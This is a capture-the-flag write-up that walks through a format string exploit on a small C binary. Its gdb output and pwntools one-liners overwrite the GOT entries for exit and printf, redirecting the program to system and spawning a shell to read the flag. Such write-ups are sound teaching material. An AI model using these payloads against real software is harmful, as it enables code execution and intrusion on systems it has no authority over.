---
title:  "Writeup: Peanut Power"
date:   2019-04-22 14:00:00
categories: writeup
author: Tim Winters
layout: post
---

```c
void peanut(void)

{
  char buffer [512];
  
  fgets(buffer,0x200,stdin);
  printf(buffer);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

This is a format string attack.

## Step 1 - Overwrite exit
Whenever I'm solving a problem, the first thing I look for is where the user input is used, and how that can be exploited. In this case, the input is printed out via printf. This means two things, 1) we have a format string attack, and 2) we can control the first argument to any function if we overwrite printf with that function. 

My first instinct is to find a way of overwriting prtinf with `system`, since that will let us call `system("/bin/sh");`. The issue with this however, is printf is only called once, so if we overwrite it, it doesn't matter. 

To get around this, we need to overwrite `exit` with `peanut`, since that will let us continuously call printf. 

### Address of exit
Looking at the ~~Game of Thrones~~ Global Offset Table, `exit`'s entry is at `0x601038`. If we look at the data at this address via gdb

```
gdb-peda$ x/4xb 0x601038
0x601038:	0x56	0x05	0x40	0x00
```

`exit` points to  `0x400556`
### Address of peanut
```
gdb-peda$ p peanut
$1 = {void ()} 0x400666 <peanut>
```

We need to overwrite the first two bytes of exit with the first two bytes of peanut i.e `0x0556 -> 0x0666`

0x0666 = 1638

```
$ python -c "print '%p'*8 + 'a'*8" | ./peanutpower
0x6020290x7ffff7dd37900x61702570257025700x6020290xd0x70257025702570250x70257025702570250x6161616161616161aaaaaaaa
```
Looks like it's the 8th entry. 

Our exploit now looks like

```
$ (python -c "from pwn import *; print '%1638u%8\$hn'.ljust(16) + p64(0x601038)"; cat) | ./peanutpower
```

If you run this, you'll be able to type anything in, and printf will spit it back out. We have successfully looped!

## Step 2 - Overwrite printf

This one is a little trickier. If we look at the entry for printf, we see that it is `0x601020`.
Examining these bytes in GDB we get 

### Address of printf

```
gdb-peda$ x/8xb 0x601020
0x601020:	0x00	0x28	0xa6	0xf7	0xff	0x7f	0x00	0x00
```

Note: If you examine this address right after you start gdb, it will point to the PLT entry, NOT the addres in libc. Examine the address after printf has been called once. 

### Address of system

```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7ffff7a52390 <__libc_system>
```

We need to overwrite the last *4* bytes of print with the last 4 bytes of system (0xf7a62800 -> 0xf7a52390)

Start by converting these bytes to decimal

|Hex| Decimal|
|---|--------|
|0x2390|9104|
|0xf7a5| 63397|

Since 0x2390 < 0xf7a5, we want to write this value first. This is because %n is cumulative, and we wouldn't be able to write the lower value if we did it second.

Let's figure out our n offsets.

```
	(python -c "from pwn import *; print '%1638u%8\$hn'.ljust(16) + p64(0x601038)"; python -c "from pwn import *; print '%p'*8 + '%p'*8 + p64(0x601020) + p64(0x601022)"; cat) | ./peanutpower
0x6020410x7ffff7dd37900xa000000000060100x6020410x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x6010200x6010220x7ffff7ff000a0x7ffff7a0d000(nil)0x7ffff7dd1b200x1000
```
Notice how I am using `'%p'*8` to give me exactly 16 bytes. This is important becuase we need the same amount of characters in our final string
Looks like the addresses we put on the stack are at 10 and 11. 


```
python -c "from pwn import *; print '%9104u%10$hn'.ljust(16) + '%54289u%11$hn'.ljust(16) + p64(0x601020) + p64(0x601022)"
```

Look at the second printf string. It doesn't have the value we put calculated earlier. Instead, it has 63397 - 9104 - 4. It's easy to see where 9104 comes from, but what about that 4? Well, the ljust(16) puts 4 extra spaces after the first format string, and they count toward the total that the next %n writes, so we need to subtract 4 from our expected value. 

```
(python -c "from pwn import *; print '%1638u%8\$hn'.ljust(16) + p64(0x601038)"; python -c "from pwn import *; print '%9104u%10\$hn'.ljust(16) + '%54289u%11\$hn'.ljust(16) + p64(0x601020) + p64(0x601022)";echo "/bin/sh"; echo "cat flag.txt") | ./peanutpower
```


 



